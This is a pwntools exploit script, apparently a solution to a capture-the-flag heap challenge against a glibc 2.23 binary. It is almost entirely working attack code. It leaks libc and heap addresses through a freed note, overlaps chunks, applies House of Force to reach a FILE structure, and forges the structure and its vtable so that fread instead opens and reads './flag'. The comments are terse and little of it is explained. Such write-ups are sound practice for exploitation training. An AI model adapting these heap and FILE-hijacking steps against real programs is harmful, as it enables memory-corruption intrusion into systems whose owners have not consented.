from pwn import *
context.log_level = 'debug'
context(arch = 'amd64', os = 'linux')
ti="./pwn1"
debug=1
if debug==0:
    io = remote()
elif debug==1:
    io =  process(ti)
elf=ELF(ti)    
libc=ELF("./libc.so.6")
s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)

def add(index,size,content): #16
    ru('Choice:')
    sl(1)    
    ru('input your index:\n')
    sl(index)
    ru('input your size:\n')#>=0x80
    sl(size)
    ru('input your context:\n')
    sl(content)

def delete(index):
    ru('Choice:')
    sl(2)    
    ru('input your index:\n')
    sl(index)

def show(index):
    ru('Choice:')
    sl(3)    
    ru('input your index:\n')
    sl(index)    

def change1(index):
    ru('Choice:')
    sl(4)    
    ru('input your index:\n')
    sl(index)

def change2(index, content):
    ru('Choice:')
    sl(4)    
    ru('input your index:\n')
    sl(index)
    sleep(0.1)
    s(content)

add(0,0x100-8,'0')
add(1,0x100-8,'1')
add(2,0x90-8,'2')
add(3,0x90-8,'3')#avoid cosolidate with top

#leak libc
delete(0)
show(0)
ru('note[0]: ')
leak=u64(ru('\n').ljust(8,'\x00'))
libc.address=leak-0x3c4b78
log.success("libc base: "+hex(libc.address))

#leak heap base
delete(2)
show(2)
ru('note[2]: ')
leak=u64(ru('\n').ljust(8,'\x00'))
heap_base=leak-0x230
log.success("heap base : "+hex(heap_base))

#overlap
add(4,0x90-8,'2'*(0x28)+p64(0x61))#get 2
delete(1)
add(5,0x100-8+0x100,'\x00'*(0x100-8)+p64(0x131))#get 0 and 1 in one chunk
delete(1)#cosolidate 1 and part of 2 to a 0x130 chunck
delete(3)#rise top
delete(4)#rise top
add(6,0x130-8,'\x00'*(0x100-8)+p64(0xffffffffffffffff))#change top size

#house_of_force to get the IO_FILE
add(7,-0x430-8,"1")

#set fileno 0 => stdin
fake = p64(0xfbad248b) + p64(heap_base+0x93)*7 + p64(heap_base + 0x94) + p64(0x0)*4 +p64(libc.address +0x3c5540) 
fake += p64(0x0) #fileno
fake += p64(0x0)*2 + p64(heap_base +0xf0) + p64(0xffffffffffffffff) + p64(0x0) + p64(heap_base+0x100) +p64(0x0)*6
add(8, 0x110-8, fake)

#recover top size
add(9, 0x130-8, 'b')
change2(0, p64(0x0) + p64(0x20dc1) +'\x00'*0xf0)

#set fd="./flag" and fileno 4 and vtable
fake = "./flag\x00\x00" + p64(heap_base+0x93)*7 + p64(heap_base + 0x94) + p64(0x0)*4 + p64(libc.address+0x3c5540) 
fake += p64(0x4) #set fileno 4 which fopen("./flag","r") 
fake += p64(0x0)*2 + p64(heap_base+0xf0) +  p64(0xffffffffffffffff)+ p64(0x0) + p64(heap_base+0x100)+p64(0x0)*6 
fake += p64(heap_base+0x250)#vtable
change2(8, fake.ljust(0x110-8, '\x00'))

#fake vtable
fake_vtable = p64(0x0)*8 
fake_vtable += p64(libc.address + 0x6dd70)#vtable->__xsgetn => _IO_new_fopen 
#glibc2.23 define fopen(fname, mode) _IO_new_fopen (fname, mode)
add(0xc, 0x80,fake_vtable)
add(0xd, 0x80, "r")
change1(0xd) #fread("r",1,0x80,stream) => __GI__IO_file_xsgetn(stream, "r", 1*0x80); <=> fopen("./flag","r") #0x80 is useless
#there will be a new IOFILE whose fileno is 4

#change vtable to a normal one
delete(0xc)
fake_vtable2 = p64(0x0)*8
fake_vtable2 += p64(libc.address + 0x78ec0)#vtable->__xsgetn =>__GI__IO_file_xsgetn
fake_vtable2 += p64(0x0)*5 
fake_vtable2 += p64(libc.address + 0x791a0)#vtable->__read => __GI__IO_file_read
add(0xe, 0x80, fake_vtable2)

#any number is okay 
#change1(0x9)#fread(notes[0x9],1,0x88,stream)
#show(0x9)
change1(0xc)#fread(notes[0x9],1,0x88,stream)
show(0xc)

io.interactive()